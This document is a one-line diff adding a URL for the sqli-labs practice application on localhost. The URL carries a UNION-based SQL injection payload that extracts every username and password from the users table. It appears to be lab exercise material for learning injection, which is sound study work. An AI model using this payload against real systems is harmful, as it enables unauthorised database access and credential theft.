@@ -1,0 +1,1 @@
+http://localhost/sqli-labs-php7/Less-1/?id=0%27%20union%20select%201,group_concat(username),group_concat(password)%20from%20users--%20-
